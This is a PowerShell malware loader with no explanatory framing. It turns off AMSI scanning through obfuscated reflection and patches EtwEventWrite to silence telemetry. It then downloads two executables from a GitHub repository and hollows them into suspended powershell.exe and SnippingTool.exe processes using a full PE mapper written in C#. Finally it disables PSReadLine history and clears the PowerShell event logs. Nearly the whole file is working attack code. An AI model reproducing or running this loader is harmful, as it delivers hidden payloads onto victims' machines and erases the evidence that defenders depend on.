#Requires -Version 5.1
param(
    [string]$LoaderUrl = "https://raw.githubusercontent.com/wavyy982/dkmsdkwo/main/loader.exe",
    [string]$AppUrl    = "https://github.com/wavyy982/dkmsdkwo/releases/download/v1/app.exe"
)

$ErrorActionPreference = 'Stop'
if (-not [Environment]::Is64BitOperatingSystem) { throw 'requires 64-bit OS' }

try {
    $g = [Ref].Assembly.GetType(('System.Management.Automation.' + 'Ama' + 'si' + 'Ut' + 'ils'))
    if ($g) {
        $f = $g.GetField(('ams' + 'iInit' + 'Faile' + 'd'), 'NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
} catch { }

try {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class EtwPatch {
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr mod, string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);

    public static void Kick() {
        if (IntPtr.Size != 8) return;
        IntPtr ntdll = GetModuleHandleA("ntdll");
        if (ntdll == IntPtr.Zero) return;
        IntPtr fn = GetProcAddress(ntdll, "Etw" + "Event" + "Write");
        if (fn == IntPtr.Zero) return;
        byte[] stub = { 0x31, 0xC0, 0xC3 };
        uint oldProt;
        if (!VirtualProtect(fn, (UIntPtr)stub.Length, 0x40, out oldProt)) return;
        Marshal.Copy(stub, 0, fn, stub.Length);
        VirtualProtect(fn, (UIntPtr)stub.Length, oldProt, out oldProt);
    }
}
'@
    [EtwPatch]::Kick()
} catch { }

$mapperSrc = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class MemMap {
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll", SetLastError=true)] static extern uint ResumeThread(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool GetThreadContext(IntPtr h, ref CONTEXT ctx);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool SetThreadContext(IntPtr h, ref CONTEXT ctx);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, UIntPtr size, uint type, uint prot);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr size, out UIntPtr written);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr size, out UIntPtr read);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool VirtualProtectEx(IntPtr h, IntPtr addr, UIntPtr size, uint prot, out uint old);
    [DllImport("ntdll.dll")] static extern int NtUnmapViewOfSection(IntPtr proc, IntPtr addr);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] static extern IntPtr GetProcAddress(IntPtr mod, string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode)] static extern IntPtr LoadLibraryW(string name);

    const uint CREATE_SUSPENDED = 0x00000004;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04, PAGE_EXECUTE_READ = 0x20, PAGE_READONLY = 0x02;
    const uint CONTEXT_FULL = 0x10000Bu;

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public uint cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags; public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs; public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
    }

    public static int Hollow(string hostPath, byte[] pe, out uint pid) {
        pid = 0;
        int eLfanew = BitConverter.ToInt32(pe, 0x3C);
        long optOff = eLfanew + 4 + 20;
        ushort magic = BitConverter.ToUInt16(pe, (int)optOff);
        if (magic != 0x20B) return -1;
        int entryRva = BitConverter.ToInt32(pe, (int)(optOff + 16));
        long imageBase = BitConverter.ToInt64(pe, (int)(optOff + 24));
        int sizeOfImage = BitConverter.ToInt32(pe, (int)(optOff + 56));
        int sizeOfHeaders = BitConverter.ToInt32(pe, (int)(optOff + 60));
        short numSections = BitConverter.ToInt16(pe, (int)(eLfanew + 4 + 2));
        int sectionTableOff = eLfanew + 4 + 20 + 240;

        var si = new STARTUPINFO(); si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        var pi = new PROCESS_INFORMATION();
        if (!CreateProcessW(hostPath, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            return -2;
        pid = pi.dwProcessId;

        var ctx = new CONTEXT(); ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, ref ctx);
        NtUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);

        IntPtr baseAddr = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (UIntPtr)sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) {
            baseAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (UIntPtr)sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (baseAddr == IntPtr.Zero) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return -3; }
        }

        byte[] hdr = new byte[sizeOfHeaders];
        Array.Copy(pe, 0, hdr, 0, Math.Min(sizeOfHeaders, pe.Length));
        UIntPtr w;
        if (!WriteProcessMemory(pi.hProcess, baseAddr, hdr, (UIntPtr)hdr.Length, out w)) {
            CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return -4;
        }

        for (int i = 0; i < numSections; i++) {
            int off = sectionTableOff + i * 40;
            int virtualSize = BitConverter.ToInt32(pe, off + 8);
            int virtualAddr = BitConverter.ToInt32(pe, off + 12);
            int rawSize = BitConverter.ToInt32(pe, off + 16);
            int rawPtr = BitConverter.ToInt32(pe, off + 20);
            uint charact = BitConverter.ToUInt32(pe, off + 36);
            if (rawSize == 0) continue;
            byte[] sec = new byte[rawSize];
            Array.Copy(pe, rawPtr, sec, 0, Math.Min(rawSize, pe.Length - rawPtr));
            IntPtr dest = IntPtr.Add(baseAddr, virtualAddr);
            WriteProcessMemory(pi.hProcess, dest, sec, (UIntPtr)sec.Length, out w);
            uint prot = PAGE_READWRITE;
            if ((charact & 0x20000000) != 0) prot = PAGE_EXECUTE_READ;
            else if ((charact & 0x40000000) == 0) prot = PAGE_READONLY;
            uint old; VirtualProtectEx(pi.hProcess, dest, (UIntPtr)Math.Max(virtualSize, 1), prot, out old);
        }

        long delta = baseAddr.ToInt64() - imageBase;
        if (delta != 0) {
            int relocRva = BitConverter.ToInt32(pe, (int)(optOff + 112 + 5 * 8));
            int relocSize = BitConverter.ToInt32(pe, (int)(optOff + 112 + 5 * 8 + 4));
            if (relocRva != 0 && relocSize != 0) {
                int relocOff = RvaToOffset(pe, relocRva, sectionTableOff, numSections);
                int pos = 0;
                while (pos < relocSize) {
                    int pageRva = BitConverter.ToInt32(pe, relocOff + pos);
                    int blockSize = BitConverter.ToInt32(pe, relocOff + pos + 4);
                    if (blockSize == 0) break;
                    int entries = (blockSize - 8) / 2;
                    for (int i = 0; i < entries; i++) {
                        ushort entry = BitConverter.ToUInt16(pe, relocOff + pos + 8 + i * 2);
                        int type = entry >> 12;
                        int offset = entry & 0x0FFF;
                        if (type == 0) continue;
                        IntPtr patchAddr = IntPtr.Add(baseAddr, pageRva + offset);
                        if (type == 10) {
                            byte[] buf = new byte[8];
                            UIntPtr r;
                            if (ReadProcessMemory(pi.hProcess, patchAddr, buf, (UIntPtr)8, out r) && r.ToUInt64() == 8) {
                                long val = BitConverter.ToInt64(buf, 0) + delta;
                                byte[] outb = BitConverter.GetBytes(val);
                                WriteProcessMemory(pi.hProcess, patchAddr, outb, (UIntPtr)8, out w);
                            }
                        } else if (type == 3) {
                            byte[] buf = new byte[4];
                            UIntPtr r;
                            if (ReadProcessMemory(pi.hProcess, patchAddr, buf, (UIntPtr)4, out r) && r.ToUInt64() == 4) {
                                int val = BitConverter.ToInt32(buf, 0) + (int)delta;
                                byte[] outb = BitConverter.GetBytes(val);
                                WriteProcessMemory(pi.hProcess, patchAddr, outb, (UIntPtr)4, out w);
                            }
                        }
                    }
                    pos += blockSize;
                }
            }
        }

        int importRva = BitConverter.ToInt32(pe, (int)(optOff + 112 + 1 * 8));
        if (importRva != 0) {
            int importOff = RvaToOffset(pe, importRva, sectionTableOff, numSections);
            int idx = 0;
            while (true) {
                int nameRva = BitConverter.ToInt32(pe, importOff + idx * 20 + 12);
                if (nameRva == 0) break;
                int nameOff = RvaToOffset(pe, nameRva, sectionTableOff, numSections);
                string dllName = ReadAscii(pe, nameOff);
                IntPtr hMod = LoadLibraryW(dllName);
                int iltRva = BitConverter.ToInt32(pe, importOff + idx * 20 + 0);
                int iatRva = BitConverter.ToInt32(pe, importOff + idx * 20 + 16);
                if (iltRva == 0) iltRva = iatRva;
                int j = 0;
                while (true) {
                    IntPtr iatAddr = IntPtr.Add(baseAddr, iatRva + j * 8);
                    byte[] tbuf = new byte[8];
                    UIntPtr rr;
                    if (!ReadProcessMemory(pi.hProcess, iatAddr, tbuf, (UIntPtr)8, out rr) || rr.ToUInt64() != 8) break;
                    long thunk = BitConverter.ToInt64(tbuf, 0);
                    if (thunk == 0) break;
                    IntPtr funcAddr;
                    if (thunk < 0) {
                        funcAddr = IntPtr.Zero;
                    } else {
                        int hintNameRva = (int)(thunk & 0x7FFFFFFF);
                        int hintNameOff = RvaToOffset(pe, hintNameRva, sectionTableOff, numSections);
                        string funcName = ReadAscii(pe, hintNameOff + 2);
                        funcAddr = GetProcAddress(hMod, funcName);
                    }
                    if (funcAddr != IntPtr.Zero) {
                        byte[] addrBytes = BitConverter.GetBytes(funcAddr.ToInt64());
                        WriteProcessMemory(pi.hProcess, iatAddr, addrBytes, (UIntPtr)8, out w);
                    }
                    j++;
                }
                idx++;
            }
        }

        ctx.Rip = (ulong)baseAddr.ToInt64() + (ulong)entryRva;
        SetThreadContext(pi.hThread, ref ctx);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    static int RvaToOffset(byte[] pe, int rva, int sectionTableOff, int numSections) {
        for (int i = 0; i < numSections; i++) {
            int off = sectionTableOff + i * 40;
            int va = BitConverter.ToInt32(pe, off + 12);
            int vs = BitConverter.ToInt32(pe, off + 8);
            int rawPtr = BitConverter.ToInt32(pe, off + 20);
            if (rva >= va && rva < va + Math.Max(vs, 1)) return rawPtr + (rva - va);
        }
        return rva;
    }

    static string ReadAscii(byte[] pe, int off) {
        int end = off;
        while (end < pe.Length && pe[end] != 0) end++;
        return Encoding.ASCII.GetString(pe, off, end - off);
    }
}
'@

Add-Type -TypeDefinition $mapperSrc

function Get-Bytes($url) {
    $wc = New-Object System.Net.WebClient
    return $wc.DownloadData($url)
}

$loaderBytes = Get-Bytes $LoaderUrl
$hostExe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$pidVar = 0
$st = [MemMap]::Hollow($hostExe, $loaderBytes, [ref]$pidVar)
if ($st -ne 0) { throw ('loader hollow failed {0}' -f $st) }
Write-Host ('loader pid {0}' -f $pidVar)

if ($AppUrl) {
    $appBytes = Get-Bytes $AppUrl
    $hostExe2 = "$env:SystemRoot\System32\SnippingTool.exe"
    if (-not (Test-Path $hostExe2)) { $hostExe2 = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" }
    $pidVar2 = 0
    $st2 = [MemMap]::Hollow($hostExe2, $appBytes, [ref]$pidVar2)
    if ($st2 -ne 0) { throw ('app hollow failed {0}' -f $st2) }
    Write-Host ('app pid {0}' -f $pidVar2)
}

try {
    Import-Module PSReadLine -ErrorAction SilentlyContinue
    $opt = Microsoft.PowerShell.Command\Get-PSReadLineOption -ErrorAction SilentlyContinue
    if ($opt) { $opt.HistorySaveStyle = 'SaveNothing' }
} catch { }
try { wevtutil cl 'Windows PowerShell' 2>$null } catch { }
try { wevtutil cl 'Microsoft-Windows-PowerShell/Operational' 2>$null } catch { }

Write-Host 'done'